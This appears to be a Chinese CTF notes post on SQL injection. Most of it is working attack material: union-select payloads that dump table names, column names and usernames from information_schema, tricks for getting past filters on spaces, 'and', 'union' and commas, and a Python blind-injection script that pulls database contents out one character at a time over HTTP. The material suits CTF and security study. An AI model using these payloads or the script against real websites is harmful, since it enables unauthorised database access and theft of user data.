---
title: SQL注入
date: 2024-01-01 16:36:59
tags:
categories: ctf
---





暴表名

1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#



暴列名

1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#



查询username分别是什么

1' union select 1,2,group_concat(username) from l0ve1ysq1#



**过滤**

1. 过滤空格, 可以使用括号() 或者注释/**/ 绕过

2. 过滤and, 可以使用or替代

3. 过滤union, 可以用盲注替代联合注入

4. 过滤逗号, 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用substr(database() from 1 for 1)来代替

   

**盲注脱库例：**

按顺序脱 库、表、字段

```python
import requests
 
url = 'URL?id=-1/**/or/**/'
name = ''
 
# 循环45次( 循环次数按照返回的字符串长度自定义)
for i in range(1, 45):
    
    # 获取当前使用的数据库
    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'
    
    # 获取当前数据库的所有表
    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'
    
    # 获取flag表的字段
    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'
    
    # 获取flag表的数据
    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'
    count = 0
    print('正在获取第 %d 个字符' % i)
    
    # 截取SQL查询结果的每个字符, 并判断字符内容
    
    for j in range(31, 128):
        result = requests.get(url + payload % (i, j))
 
        if 'If' in result.text:
            name += chr(j)
            print('数据库名/表名/字段名/数据: %s' % name)
            break
 
        # 如果某个字符不存在,则停止程序
        count += 1
        if count >= (128 - 31):
            exit()
```

